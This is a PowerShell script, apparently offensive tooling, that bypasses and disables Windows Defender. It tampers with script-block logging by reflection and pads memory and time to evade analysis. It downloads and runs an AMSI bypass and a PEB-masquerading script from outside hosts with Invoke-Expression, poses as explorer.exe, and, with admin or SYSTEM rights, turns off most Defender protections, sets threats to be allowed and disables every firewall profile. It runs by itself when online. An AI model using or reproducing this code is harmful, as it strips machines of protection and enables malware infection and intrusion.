function Invoke-OneDoesNotSimplyBypassEntireWinDefender {
    [ScriptBlock]."GetFiel`d"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
    $increment = 0
    $maxincrement = 10000000
    For ($increment=0; $increment -lt $maxincrement) {
        $increment++ }
    $fillmybuffer = "a" * 300MB
    $accessAMBY = Invoke-WebRequest https://amsi-fail.azurewebsites.net/api/Generate -UseBasicParsing
    Invoke-Expression $accessAMBY.Content
    Invoke-Expression(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/GetRektBoy724/sementara/master/Masquerade-PEB.ps1');
    MPEB -BinPath "C:\Windows\explorer.exe"
    MPEB -BinPath "C:\Windows\explorer.exe"
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    if ($p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)) { 
        Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
        Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
        Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
        Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisablePrivacyMode 1 -ErrorAction Ignore;
        Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
        Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1 -ErrorAction Ignore;
        Set-MpPreference -DisableEmailScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisableRestorePoint 1 -ErrorAction Ignore;
        Set-MpPreference -DisableScriptScanning 1 -ErrorAction Ignore;
        Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction Ignore;
        Set-MpPreference -DisableIOAVProtection 1 -ErrorAction Ignore;
        Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
        Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
        Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
        Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
        Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
        Start-Sleep 5
    } else {
        $username = [Security.Principal.WindowsIdentity]::GetCurrent().Name
        if ($username -eq "NT AUTHORITY\SYSTEM") {
            Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction Ignore;
            Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction Ignore;
            Set-MpPreference -PUAProtection disable -ErrorAction Ignore;
            Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction Ignore;
            Set-MpPreference -DisablePrivacyMode 1 -ErrorAction Ignore;
            Set-MpPreference -MAPSReporting 0 -ErrorAction Ignore;
            Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine 1 -ErrorAction Ignore;
            Set-MpPreference -DisableEmailScanning 1 -ErrorAction Ignore;
            Set-MpPreference -DisableRestorePoint 1 -ErrorAction Ignore;
            Set-MpPreference -DisableScriptScanning 1 -ErrorAction Ignore;
            Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction Ignore;
            Set-MpPreference -DisableIOAVProtection 1 -ErrorAction Ignore;
            Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Ignore;
            Set-MpPreference -HighThreatDefaultAction 6 -Force -ErrorAction Ignore;
            Set-MpPreference -ModerateThreatDefaultAction 6 -ErrorAction Ignore;
            Set-MpPreference -LowThreatDefaultAction 6 -ErrorAction Ignore;
            Set-MpPreference -SevereThreatDefaultAction 6 -ErrorAction Ignore;
            Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False;
            Start-Sleep 5
        } else {
            Start-Sleep 5
        }
    }
    Write-Host "WinDefender Bypassed! Go Ahead!"
}
$internetconnection = Test-Connection -ComputerName google.com -Quiet
if ($internetconnection) {
    Invoke-OneDoesNotSimplyBypassEntireWinDefender
}